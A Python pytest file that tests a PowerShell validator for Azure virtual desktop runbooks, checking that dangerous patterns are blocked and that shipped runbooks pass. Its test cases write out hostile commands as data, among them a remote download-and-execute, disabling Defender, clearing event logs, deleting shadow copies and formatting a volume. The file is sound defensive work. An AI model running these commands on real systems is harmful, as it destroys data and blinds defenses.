"""Dangerous-PowerShell detection, including on our own shipped runbooks."""

from __future__ import annotations

from pathlib import Path

import pytest
from app.powershell import CATALOGUE, validate_script
from app.powershell.validator import Severity

RUNBOOKS = sorted((Path(__file__).resolve().parents[2] / "runbooks").rglob("*.ps1"))

SAFE_SCRIPT = """
param([Parameter(Mandatory)][string]$VmName)
$ErrorActionPreference = 'Stop'
try { Start-Service -Name 'RDAgentBootLoader' } catch { Write-Error $_; throw }
"""


@pytest.mark.parametrize(
    "snippet,rule",
    [
        ("Invoke-Expression $payload", "dynamic_execution"),
        ("iex (New-Object Net.WebClient).DownloadString('http://x')", "dynamic_execution"),
        ("powershell -EncodedCommand ZXZpbA==", "encoded_command"),
        ("Remove-Item C:\\Profiles -Recurse -Force", "recursive_delete"),
        ("Remove-AzVM -Name AVD-VM-023", "resource_deletion"),
        ("Remove-Item \\\\st\\profiles\\user.vhdx", "profile_deletion"),
        ("Format-Volume -DriveLetter D", "disk_format"),
        ("New-AzRoleAssignment -RoleDefinitionName Owner", "role_assignment"),
        ("Set-ExecutionPolicy Bypass", "execution_policy"),
        ("Set-MpPreference -DisableRealtimeMonitoring $true", "defender_change"),
        ("wevtutil cl System", "log_clearing"),
        ("$p = ConvertTo-SecureString 'hunter2' -AsPlainText -Force", "plaintext_secret"),
        ("$password = 'SuperSecret123'", "hardcoded_credential"),
        ("vssadmin delete shadows /all", "shadow_copy_delete"),
    ],
)
def test_dangerous_patterns_block(snippet: str, rule: str) -> None:
    report = validate_script(SAFE_SCRIPT + "\n" + snippet)
    assert not report.passed, f"{rule} was not blocked"
    assert rule in {f.rule for f in report.blocking}


def test_comments_are_not_flagged() -> None:
    script = SAFE_SCRIPT + "\n# Never use Invoke-Expression or Remove-Item -Recurse here.\n"
    assert validate_script(script).passed


def test_generated_script_requires_structure() -> None:
    report = validate_script("Start-Service RDAgent", generated=True)
    assert not report.passed
    rules = {f.rule for f in report.blocking}
    assert {"missing_param_block", "missing_error_handling"} <= rules


def test_structure_only_warns_for_reviewed_runbooks() -> None:
    report = validate_script("Start-Service RDAgent", generated=False)
    assert report.passed
    assert any(f.severity is Severity.WARNING for f in report.findings)


@pytest.mark.parametrize("path", RUNBOOKS, ids=lambda p: p.name)
def test_shipped_runbooks_pass_validation(path: Path) -> None:
    report = validate_script(path.read_text(encoding="utf-8"))
    assert report.passed, f"{path.name}: {[f.message for f in report.blocking]}"


def test_every_executable_action_has_a_real_runbook() -> None:
    for action in CATALOGUE.values():
        if not action.executable:
            continue
        assert action.runbook_path, f"{action.action_id} claims to be executable with no runbook"
        assert not action.script().startswith("# Runbook"), f"{action.action_id} runbook missing"
